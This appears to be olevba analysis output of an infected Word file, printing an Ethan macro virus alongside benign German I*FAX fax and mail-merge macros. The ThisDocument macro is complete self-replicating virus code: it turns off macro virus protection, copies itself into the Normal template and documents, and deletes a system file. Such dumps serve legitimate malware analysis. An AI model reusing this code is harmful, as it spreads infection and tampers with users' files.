olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
s = ActiveDocument.Saved
Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
Randomize
If Dir("c:\ethan.___", 6) = "" Then
Open "c:\ethan.___" For Output As #1
For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
Print #1, a
Next i
Close #1
SetAttr "c:\ethan.___", 6
End If
If Dir("c:\class.sys") <> "" Then Kill "c:\class.sys"
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set t = NormalTemplate.VBProject.VBComponents.Item(1)
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set t = ActiveDocument.VBProject.VBComponents.Item(1)
Else
t = ""
End If
If t <> "" Then
Open "c:\ethan.___" For Input As #1
If LOF(1) = 0 Then GoTo q
i = 1
Do While Not EOF(1)
Line Input #1, a
t.CodeModule.InsertLines i, a
i = i + 1
Loop
q:
Close #1
If Rnd < 0.3 Then With Dialogs(wdDialogFileSummaryInfo): .Title = "Ethan Frome": .Author = "EW/LN/CB": .Keywords = "Ethan": .Execute: End With
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End Sub
-------------------------------------------------------------------------------
VBA MACRO IFaxSerienfaxW32.bas 
in file: Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c - OLE stream: 'Macros/VBA/IFaxSerienfaxW32'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'------------------------------------------------------------------------------------------------------
' HAUPTPROGRAMM SERIENFAX FÜR IFAX-DRUCKERTREIBER
' Version für Word 8.0
' Autor:            Stefan Huber
' Datum:            18.08.97
' Änderungen:
' Datum     Beschreibung
' 13.12.96  Sollte Datenfeld Faxnummer leer sein, wird "!!!KeineFaxnummer!!!" an Faxtreiber übergeben
' 23.09.97  + und Blanks in Faxnummer für Autofax erlaubt
' 14.11.97
'------------------------------------------------------------------------------------------------------
Private Declare Function SerBeginSerfax Lib "Serfax.dll" () As Integer
Private Declare Function SerPrintSerfax Lib "Serfax.dll" (ByVal Faxno$) As Integer
Private Declare Function SerPrintAutofaxWithSubj Lib "Serfax.dll" (ByVal Faxno$, ByVal Subject$) As Integer

Private Declare Function GetTempPath Lib "Kernel32" Alias "GetTempPathA" (ByVal stringnum As Integer, ByVal stringbuffer$) As Integer
Private Declare Function GetWindowsDirectory Lib "Kernel32" Alias "GetWindowsDirectoryA" (ByVal stringbuffer$, ByVal stringnum As Integer) As Integer
Private Declare Function GetPrivateProfileString Lib "Kernel32" Alias "GetPrivateProfileStringA" (ByVal lpszSection$, ByVal lpszEntry$, ByVal lpszDefault$, ByVal lpszReturnBuffer$, ByVal cbReturnBuffer As Integer, ByVal lpszFilename$) As Integer


Public Sub MAIN()
Dim DefPrinter$

On Error GoTo KeinHauptdokument
WordBasic.MailMergeEditMainDocument

' Faxdrucker einrichten
DefPrinter$ = Application.ActivePrinter
If UCase(Application.ActivePrinter) <> UCase(PRINTER_TO_PORT_STRING) Then
    Application.ActivePrinter = PRINTER_TO_PORT_STRING
End If

' SerienfaxDialog anzeigen
dlgMailMergeFax.Caption = MAIL_MERGE_DLG_CAPTION
dlgMailMergeFax.Label1 = MAIL_MERGE_DLG_TEXT1
dlgMailMergeFax.Label2 = MAIL_MERGE_DLG_TEXT2
dlgMailMergeFax.Label3 = MAIL_MERGE_DLG_TEXT3
dlgMailMergeFax.Label4 = MAIL_MERGE_DLG_TEXT4
dlgMailMergeFax.cmdOptions.Caption = MAIL_MERGE_DLG_CMD_OPTIONS
dlgMailMergeFax.cmdFax.Caption = MAIL_MERGE_DLG_CMD_START_FAX
dlgMailMergeFax.cmdCancel.Caption = MAIL_MERGE_DLG_CMD_CANCEL

dlgMailMergeFaxOptions.Caption = MAIL_MERGE_OPT_DLG_CAPTION
dlgMailMergeFaxOptions.Frame2.Caption = MAIL_MERGE_OPT_DLG_CHOOSE_RECORDS
dlgMailMergeFaxOptions.Label1 = MAIL_MERGE_OPT_DLG_RECORDS_FROM
dlgMailMergeFaxOptions.Label2 = MAIL_MERGE_OPT_DLG_RECORDS_TO
dlgMailMergeFaxOptions.Label3 = MAIL_MERGE_OPT_DLG_RECORDS_USE
dlgMailMergeFaxOptions.Frame1.Caption = MAIL_MERGE_OPT_DLG_FAX_PRIORITY
dlgMailMergeFaxOptions.optHigh.Caption = MAIL_MERGE_OPT_DLG_HIGH
dlgMailMergeFaxOptions.optNormal.Caption = MAIL_MERGE_OPT_DLG_NORMAL
dlgMailMergeFaxOptions.OptLow.Caption = MAIL_MERGE_OPT_DLG_LOW
dlgMailMergeFaxOptions.chkOverwritePriority.Caption = MAIL_MERGE_OPT_DLG_OVERWRITE_PRIORITY
dlgMailMergeFaxOptions.cmdOK.Caption = MAIL_MERGE_OPT_DLG_CMD_OK
dlgMailMergeFaxOptions.labPriority.Caption = MAIL_MERGE_OPT_DLG_PRIORITY
dlgMailMergeFax.Show

'Standarddrucker wiederherstellen
On Error Resume Next
If UCase(Application.ActivePrinter) <> UCase(DefPrinter$) Then
    Application.ActivePrinter = DefPrinter$
End If

GoTo ende

'***************
'Fehlerbehandlung
KeinHauptdokument:
WordBasic.MsgBox SERIENFAX_MSG2_TEXT1

'***************
'Aufräumarbeiten
ende:
End Sub


-------------------------------------------------------------------------------
VBA MACRO IFaxFaxW32.bas 
in file: Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c - OLE stream: 'Macros/VBA/IFaxFaxW32'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'--------------------------------------------------------------------------
' IFaxFax: Sendet aktuelles Dokument als Fax und stellt anschließend
' Standarddrucker wieder her
' Autor: Stefan Huber
' Datum: 09.04.95
'--------------------------------------------------------------------------

Public Sub MAIN()
Dim DefPrinter$

Call Fax

End Sub

-------------------------------------------------------------------------------
VBA MACRO IFaxAutoFaxW32.bas 
in file: Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c - OLE stream: 'Macros/VBA/IFaxAutoFaxW32'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Declare Function SerBeginSerfax Lib "Serfax.dll" () As Integer
Private Declare Function SerPrintSerfax Lib "Serfax.dll" (ByVal Faxno$) As Integer
Private Declare Function SerPrintAutofax Lib "Serfax.dll" (ByVal Faxno$) As Integer
Private Declare Function SerPrintAutofaxWithSubj Lib "Serfax.dll" (ByVal Faxno$, ByVal Subject$) As Integer


Private Declare Function GetTempPath Lib "Kernel32" Alias "GetTempPathA" (ByVal stringnum As Integer, ByVal stringbuffer$) As Integer
Private Declare Function GetWindowsDirectory Lib "Kernel32" Alias "GetWindowsDirectoryA" (ByVal stringbuffer$, ByVal stringnum As Integer) As Integer

Private Declare Function GetPrivateProfileString Lib "Kernel32" Alias "GetPrivateProfileStringA" (ByVal lpszSection$, ByVal lpszEntry$, ByVal lpszDefault$, ByVal lpszReturnBuffer$, ByVal cbReturnBuffer As Integer, ByVal lpszFilename$) As Integer

Public Sub MAIN()
Dim szFaxPrefix As String
Dim szSubjectPrefix As String
Dim szFaxno As String
Dim szSubject As String
Dim DefPrinter$
'An den Anfang des Dokuments gehen
WordBasic.StartOfDocument

'Faxprefix bestimmen
szFaxPrefix = WordBasic.[GetProfileString$](GLOBAL_IFAX, GLOBAL_IFAXPREFIX)
szSubjectPrefix = WordBasic.[GetProfileString$](GLOBAL_IFAX, GLOBAL_IFAXSUBJECT)

'das erste Vorkommen von prefix$ suchen
Call GetTextBehindPrefix(szFaxPrefix, szFaxno)
Call GetTextBehindPrefix(szSubjectPrefix, szSubject)
szSubject = FilterString(szSubject, Chr$(13))
szFaxno = GetNumbersOnly$(szFaxno)
If szFaxno = "" Then
'   Goto Druck
End If

Druck:
'Ausdrucken des Dokuments
rc = SerPrintAutofaxWithSubj(szFaxno, szSubject)

' Dokument ausdrucken
Call Fax

WordBasic.StartOfDocument

ende:

End Sub


-------------------------------------------------------------------------------
VBA MACRO IFAX_Globals.bas 
in file: Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c - OLE stream: 'Macros/VBA/IFAX_Globals'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'---------------------------------------------------------------------
'DEUTSCH
'---------------------------------------------------------------------

' Allgemeine Konstanten (NICHT lokalisieren)

Global Const GLOBAL_IFAX = "IFAX"
Global Const GLOBAL_IFAXSUBJECT = "IFAX_SUBJECT"
Global Const GLOBAL_IFAXPREFIX = "FAXPREFIX"

' Konstanten im Autonew Makro
Global Const AUTONEW_DLG1_TEXT1 = "Herzlich Willkommen zur I*FAX Makro Installation !"
Global Const AUTONEW_DLG1_TEXT2 = "Zum korrekten Funktionieren der Makros benötigt I*FAX nun einige Angaben von Ihnen:"
Global Const AUTONEW_DLG1_TEXT3 = "* Faxnummernpräfix:"
Global Const AUTONEW_DLG1_TEXT4 = "* Betreffpräfix:"
Global Const AUTONEW_DLG1_TEXT5 = "Beispielsweise ist Ihr Faxnummernpräfix 'Fax:', wenn Sie in Ihren Dokumenten die Faxnummer in der Form 'Fax: 089/47999' angeben."
Global Const AUTONEW_DLG1_TEXT6 = "Das Betreffpräfix ist optional und dient zum automatischen Auffinden des Betreffs in Ihren Dokumenten."
Global Const AUTONEW_DLG1_TEXT7 = "FAX:"
Global Const AUTONEW_DLG1_TEXT8 = "Betreff:"

Global Const AUTONEW_MSG1_TEXT1 = "Die I*FAX-Makros werden jetzt in Ihre NORMAL_DOT kopiert."

Global Const AUTONEW_DLG3_TEXT1 = "Die Installation der I*FAX Makros ist abgeschlossen."
Global Const AUTONEW_DLG3_TEXT2 = "Sie sollten nun eine neue Kommandoleiste I*FAX sehen, welche die 3 Fax-Makros enthält."

'(NICHT lokalisieren)
Global Const AUTONEW_ORIG_AUTOFAX_NAME = "WW80:IFaxAutoFaxW32"
Global Const AUTONEW_DEST_AUTOFAX_NAME = "IFaxAutoFaxW32"
Global Const AUTONEW_ORIG_FAX_NAME = "WW80:IFaxFaxW32"
Global Const AUTONEW_DEST_FAX_NAME = "IFaxFaxW32"
Global Const AUTONEW_ORIG_SERIENFAX_NAME = "WW80:IFaxSerienfaxW32"
Global Const AUTONEW_DEST_SERIENFAX_NAME = "IFaxSerienfaxW32"

Global Const AUTONEW_DEST_AUTOFAX_CAPTION = "AutoFax"
Global Const AUTONEW_DEST_FAX_CAPTION = "Fax"
Global Const AUTONEW_DEST_SERIENFAX_CAPTION = "SerienFax"



' Konstanten im Autofax Makro


' Konstanten für Serienfax
Global Const MAIL_MERGE_DLG_CAPTION = GLOBAL_IFAX + " Serienfax Option"
Global Const MAIL_MERGE_DLG_TEXT1 = "I. Wählen Sie das Feld der Datenquelle, welches die Faxnummer enthält"
Global Const MAIL_MERGE_DLG_TEXT2 = "II. Geben Sie optional eine Kennung für Ihre Serienfax-Aktion an"
Global Const MAIL_MERGE_DLG_TEXT3 = "III. Wählen Sie ein Feld aus der Datenquelle, welches zusätzlich im Betreff-Feld der Mail Nachricht angegeben wird (optional)"
Global Const MAIL_MERGE_DLG_TEXT4 = "IV. Starten Sie die Serienfax-Aktion"
Global Const MAIL_MERGE_DLG_CMD_OPTIONS = "Optionen ..."
Global Const MAIL_MERGE_DLG_CMD_START_FAX = "Serienfax starten"
Global Const MAIL_MERGE_DLG_CMD_CANCEL = "Abbrechen"

Global Const MAIL_MERGE_OPT_DLG_CAPTION = "Optionen"
Global Const MAIL_MERGE_OPT_DLG_CHOOSE_RECORDS = "Datensätze auswählen"
Global Const MAIL_MERGE_OPT_DLG_RECORDS_FROM = "Nur Datensätze von "
Global Const MAIL_MERGE_OPT_DLG_RECORDS_TO = "bis"
Global Const MAIL_MERGE_OPT_DLG_RECORDS_USE = "verwenden"
Global Const MAIL_MERGE_OPT_DLG_FAX_PRIORITY = "Fax-Priorität"
Global Const MAIL_MERGE_OPT_DLG_HIGH = "Hoch"
Global Const MAIL_MERGE_OPT_DLG_NORMAL = "Normal"
Global Const MAIL_MERGE_OPT_DLG_LOW = "Niedrig"
Global Const MAIL_MERGE_OPT_DLG_OVERWRITE_PRIORITY = "Prioritäten in der Datenquelle überschreiben"
Global Const MAIL_MERGE_OPT_DLG_CMD_OK = "OK"
Global Const MAIL_MERGE_OPT_DLG_PRIORITY = ""

Global Const SERIENFAX_DLG1_TEXT1 = GLOBAL_IFAX + " Serienfax Option"
Global Const SERIENFAX_DLG1_TEXT2 = "Willkommen zu " + GLOBAL_IFAX + "-Serienfax"
Global Const SERIENFAX_DLG1_TEXT3 = "I. Sie haben Ihre Seriendruckdatei geöffnet"
Global Const SERIENFAX_DLG1_TEXT4 = "II. und das " + GLOBAL_IFAX + "-Serienfax Makro aufgerufen"
Global Const SERIENFAX_DLG1_TEXT5 = "Vorrausetzungen damit dieses Makro funktioniert:"
Global Const SERIENFAX_DLG1_TEXT6 = "Wählen Sie nun den Namen des Datenfelds aus,"
Global Const SERIENFAX_DLG1_TEXT7 = " das die Faxnummer enthält"
Global Const SERIENFAX_DLG1_TEXT8 = "&Faxen"

Global Const SERIENFAX_MSG1_TEXT1 = "Geben Sie bitte den Namen des Datenfelds, das die Faxnummer enthält an"
Global Const SERIENFAX_MSG1_TEXT2 = "Datensatz "
Global Const SERIENFAX_MSG1_TEXT3 = " mit Faxnummer "
Global Const SERIENFAX_MSG1_TEXT4 = " wird gedruckt"

Global Const SERIENFAX_MSG2_TEXT1 = "Während des Seriendruckes ist ein allgemeiner Fehler aufgetreten. Seriendruck wird beendet"
Global Const SERIENFAX_MSG3_TEXT1 = "Sie müssen zuerst ein Hauptdokument erstellen"
Global Const SERIENFAX_MSG4_TEXT1 = "Der Seriendruck ist abgeschlossen. Es wurden "
Global Const SERIENFAX_MSG4_TEXT2 = " Datensätze erfolgreich verarbeitet"

Global Const SERIENFAX_MSG5_TEXT1 = "!!!KeineFaxnummer!!!"

Global Const SERIENFAX_MSG6_TEXT1 = ""

Global Const SERIENFAX_MSG7_TEXT1 = ""

' Konstanten für Fax

' Konstanten GetDefaultPrinter
Global Const DEFPRTR_MSG1_TEXT1 = "Nur File Port vorhanden"
Global Const DEFPRTR_MSG2_TEXT1 = "Kein Faxtreiber vorhanden !!!!!"
Global Const DEFPRTR_MSG3_TEXT1 = "Fax konnte wegen eines Druckerfehlers nicht gesendet werden."

' Konstanten für Druckereinrichtung (UNBEDINGT lokalisieren)
Global Const PRINTER_TO_PORT_STRING = "IFax on IFax:" 'Englisch: IFAX on IFAX:


'---------------------------------------------------------------------
-------------------------------------------------------------------------------
VBA MACRO IFAX_Functions.bas 
in file: Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c - OLE stream: 'Macros/VBA/IFAX_Functions'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Function Fax()
Dim DefPrinter$
DefPrinter$ = Application.ActivePrinter

If UCase(Application.ActivePrinter) <> UCase(PRINTER_TO_PORT_STRING) Then
    Application.ActivePrinter = PRINTER_TO_PORT_STRING
End If

WordBasic.FilePrint Background:=0

'Standarddrucker wiederherstellen
If UCase(Application.ActivePrinter) <> UCase(DefPrinter$) Then
    Application.ActivePrinter = DefPrinter$
End If
End Function

'------------------------------------------------------------------------------------------------------
' ZähleDatensätze: Zählt die Anzahl der Datensätze
'------------------------------------------------------------------------------------------------------
Public Function CountDataRecords()

WordBasic.MailMergeLastRecord
CountDataRecords = WordBasic.MailMergeGoToRecord()

End Function

'------------------------------------------------------------------------------------------------------
' FilterString:
'------------------------------------------------------------------------------------------------------
Public Function FilterString(szValue As String, aChar As String)
Dim number$
Dim i
Dim c$

i = 1
number$ = ""
While i <= Len(szValue)
   c$ = Mid(szValue, i, 1)
   If c$ <> aChar Then
      number$ = number$ + Mid(szValue, i, 1)
   End If
   i = i + 1
Wend

FilterString = number$
End Function

'------------------------------------------------------------------------------------------------------
' GetNumbersOnly: holt nur die Ziffern aus der Faxnummer
'------------------------------------------------------------------------------------------------------
Public Function GetNumbersOnly(szValue As String) As String
Dim number$
Dim i
Dim c$

number$ = ""
i = 1
While i <= Len(szValue)
   c$ = Mid(szValue, i, 1)
   If IsValidC$(c$) = "0" Then
      GoTo ende
   End If

   If c$ >= "0" And c$ <= "9" Or c$ = "L" Or c$ = "H" Or c$ = "+" Or c$ = "-" Then
      number$ = number$ + Mid(szValue, i, 1)
   End If

   i = i + 1
Wend

ende:
If number$ = "" Then
    number$ = SERIENFAX_MSG5_TEXT1
End If

GetNumbersOnly = number$
End Function

'----------------------------------
Public Function IsValidC$(ch$)
If (ch$ >= "0" And ch$ <= "9") Or ch$ = "(" Or ch$ = ")" Or ch$ = "+" Or ch$ = "-" Or ch$ = "/" Or ch$ = " " Or ch$ = "L" Or ch$ = "H" Or ch$ = " " Or ch$ = "+" Or ch$ = Chr$(8) Or ch$ = Chr$(9) Or ch$ = Chr$(10) Then
   IsValidC$ = "1"
Else
   IsValidC$ = "0"
End If
End Function




'------------------------------------------------------------------------------------------------------
' GetTextBehindPrefix:
'------------------------------------------------------------------------------------------------------
Public Sub GetTextBehindPrefix(szPrefix As String, ByRef szValue As String)
'On Error GoTo -1: On Error GoTo Ende
WordBasic.StartOfDocument
Selection.Find.ClearFormatting
With Selection.Find
        .Text = szPrefix
        .Replacement.Text = ""
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
   End With
szValue = ""
If Selection.Find.Execute = True Then
    'Markierung von fax: aufheben
    Selection.MoveRight
    Selection.MoveLeft
    Selection.MoveRight

    'Faxnummer einlesen
    WordBasic.EndOfLine (1)
    szValue = Selection
End If

End Sub

'------------------------------------------------------------------------------------------------------
' GetDefaultPrinter: stellt IFax-Drucker ein und gibt den Standarddrucker zurück
'------------------------------------------------------------------------------------------------------
Function GetDefaultPrinter$()
Dim lpFaxDriverName$
Dim lpFilePort$
Dim lpOn$
Dim lpDefaultPrinter$
Dim lpDefaultPrinterName$
Dim lpDefaultPrinterPort$
Dim nPos
Dim lpPrinter$
Dim lpFaxDriverEntry$
Dim nLen
Dim lpPort$

    lpFaxDriverName$ = "IFax"
    lpFilePort$ = "IFax:"
    lpOn$ = " on "

    lpDefaultPrinter$ = WordBasic.[GetProfileString$]("Windows", "device")
    If lpDefaultPrinter$ = "" Then
        lpDefaultPrinterName$ = ""
        lpDefaultPrinterPort$ = ""
    Else
        nPos = InStr(lpDefaultPrinter$, ",")
        lpDefaultPrinterName$ = Mid(lpDefaultPrinter$, 1, nPos - 1)   'default printer's name
        nPos = InStr(nPos + 1, lpDefaultPrinter$, ",")
        lpDefaultPrinterPort$ = Mid(lpDefaultPrinter$, nPos + 1)    'default printer's port
    End If

    If lpDefaultPrinterName$ = lpFaxDriverName$ And lpFilePort$ <> lpDefaultPrinterPort$ Then
        lpPrinter$ = ""
    Else
        lpFaxDriverEntry$ = WordBasic.[GetProfileString$]("devices", lpFaxDriverName$)
        If lpFaxDriverEntry$ = "" Then GoTo NoFaxDriver

        nPos = InStr(lpFaxDriverEntry$, ",") + 1            'first port position
        nLen = InStr(nPos, lpFaxDriverEntry$, ",") - nPos       'first port length
        If nLen < 0 Then
            lpPort$ = Mid(lpFaxDriverEntry$, nPos)      'first port name
        Else
            lpPort$ = Mid(lpFaxDriverEntry$, nPos, nLen)    'first port name
        End If

        While lpPort$ = lpFilePort$
            If nLen < 0 Then GoTo NoCommPort        'only FILE port connected
            
            nPos = nPos + nLen + 1              'second port position
            nLen = InStr(nPos, lpFaxDriverEntry$, ",") - nPos   'second port length
            If nLen < 0 Then
                lpPort$ = Mid(lpFaxDriverEntry$, nPos)  'second port name
            Else
                lpPort$ = Mid(lpFaxDriverEntry$, nPos, nLen)
            End If
        Wend
        lpPrinter$ = lpFaxDriverName$ + lpOn$ + lpPort$
        On Error GoTo -1: On Error GoTo ErrorHandle
        WordBasic.FilePrintSetup Printer:=lpPrinter$            'set default printer
    End If

    GetDefaultPrinter$ = lpDefaultPrinterName$ + lpOn$ + lpDefaultPrinterPort$
    GoTo LEnd:

NoCommPort:
WordBasic.MsgBox DEFPRTR_MSG1_TEXT1
GoTo ErrorHandle

NoFaxDriver:
WordBasic.MsgBox DEFPRTR_MSG2_TEXT1
GoTo ErrorHandle

ErrorHandle:
WordBasic.MsgBox DEFPRTR_MSG3_TEXT1, GLOBAL_IFAX
    
LEnd:
    WordBasic.PrintStatusBar ""

End Function

-------------------------------------------------------------------------------
VBA MACRO dlgMailMergeFax.frm 
in file: Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c - OLE stream: 'Macros/VBA/dlgMailMergeFax'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Declare Function SerBeginSerfax Lib "Serfax.dll" () As Integer
Private Declare Function SerPrintSerfax Lib "Serfax.dll" (ByVal Faxno$) As Integer
Private Declare Function SerPrintAutofaxWithSubj Lib "Serfax.dll" (ByVal Faxno$, ByVal Subject$) As Integer

Private Declare Function GetTempPath Lib "Kernel32" Alias "GetTempPathA" (ByVal stringnum As Integer, ByVal stringbuffer$) As Integer
Private Declare Function GetWindowsDirectory Lib "Kernel32" Alias "GetWindowsDirectoryA" (ByVal stringbuffer$, ByVal stringnum As Integer) As Integer
Private Declare Function GetPrivateProfileString Lib "Kernel32" Alias "GetPrivateProfileStringA" (ByVal lpszSection$, ByVal lpszEntry$, ByVal lpszDefault$, ByVal lpszReturnBuffer$, ByVal cbReturnBuffer As Integer, ByVal lpszFilename$) As Integer


'---------------------------------------------------------------------------
' GetExtraInfo
'---------------------------------------------------------------------------
Private Sub GetExtraInfo(ByVal szExtraInfoField As String, szExtraInfo As String, szFaxnoField As String, ByRef szFaxno As String, AktDSatz)

'Faxnummer
WordBasic.MailMergeGoToRecord AktDSatz
szFaxno = WordBasic.[GetMergeField$](szFaxnoField)
If szFaxno = "" Then
    szFaxno = SERIENFAX_MSG5_TEXT1
End If

'Extra Information
szExtraInfo = WordBasic.[GetMergeField$](szExtraInfoField)
If szExtraInfo = "" Then
    szExtraInfo = SERIENFAX_MSG6_TEXT1
End If
End Sub





'------------------------------------------------------------------------------------------------------
' FaxDialog: Zeigt eine kleine Dialogbox für 200 ms
'------------------------------------------------------------------------------------------------------
Private Sub FaxDialog(FaxText$)
Dim ii

WordBasic.BeginDialog 488, 68, GLOBAL_IFAX
    WordBasic.Text 31, 10, 180, 13, SERIENFAX_MSG6_TEXT1
    WordBasic.PushButton 300, 15, 1, 1, ""
    WordBasic.Text 37, 35, 300, 14, FaxText$
WordBasic.EndDialog
Dim dlg4 As Object: Set dlg4 = WordBasic.CurValues.UserDialog
ii = WordBasic.Dialog.UserDialog(dlg4, 1, 1000)

End Sub



Private Sub cmdCancel_Click()
dlgMailMergeFax.hide
End Sub

Private Sub cmdFax_Click()
Dim szMailMergeID, szMailMergeExtraInfoField, szMailMergeExtraInfo As String
Dim DatenfeldFaxno$
Dim nFrom, nTo

' Initialiesierung der Datenfelder
DatenfeldFaxno$ = dlgMailMergeFax.comboFaxnoField.Value
If DatenfeldFaxno$ = "" Then
    WordBasic.MsgBox SERIENFAX_MSG1_TEXT1
    'GoTo ZeigeDialogBox
End If

szMailMergeID = dlgMailMergeFax.txtMailMergeID
szMailMergeExtraInfoField = dlgMailMergeFax.comboExtraField.Value

' Anzahl der Datensätze bestimmen
WordBasic.ScreenUpdating 0
AnzDSatz = CountDataRecords
'WordBasic.MailMergeEditDataSource
'Steuerdatei$ = WordBasic.[FileName$]()
'WordBasic.FileClose 2

nTo = Val(dlgMailMergeFaxOptions.comboTo)
nFrom = Val(dlgMailMergeFaxOptions.comboFrom)
If nTo > 0 Then
    AnzDSatz = nTo
End If

' Für alle Datensätze
For AktDSatz = nFrom To AnzDSatz
    On Error GoTo -1: On Error GoTo AllgemeinerFehler
    WordBasic.ScreenUpdating 0

    'Faxnummer und SerienfaxID aus der Datenquelle ermitteln
    Call GetExtraInfo(szMailMergeExtraInfoField, szMailMergeExtraInfo, DatenfeldFaxno$, Faxno$, AktDSatz)
    
    'Fax-Priorität setzen
    If dlgMailMergeFaxOptions.chkOverwritePriority = True Then
        If StrConv(Mid$(Faxno$, 1, 1), vbUpperCase) = "H" Or StrConv(Mid$(Faxno$, 1, 1), vbUpperCase) = "L" Then
            Faxno$ = dlgMailMergeFaxOptions.labPriority + Mid$(Faxno$, 2, Len(Faxno$))
        Else
            Faxno$ = dlgMailMergeFaxOptions.labPriority + Mid$(Faxno$, 1, Len(Faxno$))
        End If
        
    End If
    
    'Subject Zeile zusammenbasteln
    Subject$ = szMailMergeID + " " + szMailMergeExtraInfo
    ' Faxnummer filtern (v. a. Leerzeichen entfernen)
    Faxno$ = GetNumbersOnly$(Faxno$)
    rc = SerPrintAutofaxWithSubj(Faxno$, Subject$)
    
    ' Jetzt den eigentlichen Datensatz wegfaxen
    WordBasic.WW2_PrintMerge Destination:=1, MergeRecords:=1, From:=AktDSatz, To:=AktDSatz, Suppression:=0
    WordBasic.FilePrint Background:=0, Range:=0
    WordBasic.FileClose 2

    'Fortschrittsdialog
    WordBasic.ScreenUpdating 1
    FaxDialog SERIENFAX_MSG1_TEXT2 + Str(AktDSatz) + SERIENFAX_MSG1_TEXT3 + Faxno$ + SERIENFAX_MSG1_TEXT4
Next
AktDSatz = AktDSatz - 1

'Ab hier folgt Fehlerbehandlung
GoTo ende

AllgemeinerFehler:
WordBasic.MsgBox SERIENFAX_MSG2_TEXT1
GoTo ende

KeinHauptdokument:
WordBasic.MsgBox SERIENFAX_MSG3_TEXT1
GoTo ende

ende:
WordBasic.MsgBox SERIENFAX_MSG4_TEXT1 + Str(AktDSatz - nFrom + 1) + SERIENFAX_MSG4_TEXT2
dlgMailMergeFax.hide
End Sub

Private Sub cmdOptions_Click()
dlgMailMergeFaxOptions.Show
End Sub

Private Sub comboFaxnoField_Change()
End Sub

Private Sub CommandButton2_Click()

End Sub

Private Sub comboFaxnoField_Click()

End Sub

Private Sub comboFaxnoField_DropButtonClick()
cmdFax.Enabled = True
End Sub

Private Sub comboFaxnoField_Enter()
End Sub

Private Sub comboFaxnoField_Exit(ByVal Cancel As MSForms.ReturnBoolean)
End Sub

Private Sub comboFaxnoField_KeyPress(ByVal KeyAscii As MSForms.ReturnInteger)

End Sub

Private Sub UserForm_Activate()


End Sub

Private Sub UserForm_Click()

End Sub

Private Sub UserForm_Initialize()
'Felder initialisieren

n = WordBasic.CountMergeFields()
ReDim ComboBox1__$(n - 1)
For i = 0 To n - 1
    comboFaxnoField.AddItem WordBasic.[MergeFieldName$](i + 1)
    comboExtraField.AddItem WordBasic.[MergeFieldName$](i + 1)
Next i
txtMailMergeID = ActiveDocument.Name

If comboFaxnoField.ListCount <> 0 Then
    comboFaxnoField.Value = comboFaxnoField.List(0, 0)
End If

If comboExtraField.ListCount <> 0 Then
    comboExtraField.Value = comboExtraField.List(0, 0)
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO dlgMailMergeFaxOptions.frm 
in file: Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c - OLE stream: 'Macros/VBA/dlgMailMergeFaxOptions'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub chkOverwritePriority_Click()
Frame1.Enabled = chkOverwritePriority.Value
optHigh.Enabled = chkOverwritePriority.Value
optNormal.Enabled = chkOverwritePriority.Value
OptLow.Enabled = chkOverwritePriority.Value
End Sub

Private Sub cmdOK_Click()
Me.hide

'Prioritätsstring setzen
If optHigh = True Then
    labPriority = "H"
End If

If OptLow = True Then
    labPriority = "L"
End If

If optNormal = True Then
    labPriority = ""
End If

If Val(comboFrom.Value) <= 0 Then
    comboFrom.Value = "1"
End If
If Val(comboTo.Value) < 0 Then
    comboTo.Value = "0"
End If

End Sub

Private Sub Frame2_Click()

End Sub

Private Sub labPriority_Click()

End Sub

Private Sub UserForm_Activate()


End Sub

Private Sub UserForm_Click()

End Sub

Private Sub UserForm_Initialize()
Dim nDataRecords As Integer
Dim i As Integer
nDataRecords = CountDataRecords

If comboFrom.ListCount = 0 Then
    For i = 1 To nDataRecords
     comboFrom.AddItem (Str(i))
     comboTo.AddItem (Str(i))
    Next i

    If comboFrom.ListCount <> 0 Then
        comboFrom.Value = comboFrom.List(0, 0)
    End If

    If comboTo.ListCount <> 0 Then
      comboTo.Value = comboTo.List(nDataRecords - 1, 0)
    End If
End If ' nur beim ersten mal
optNormal = True
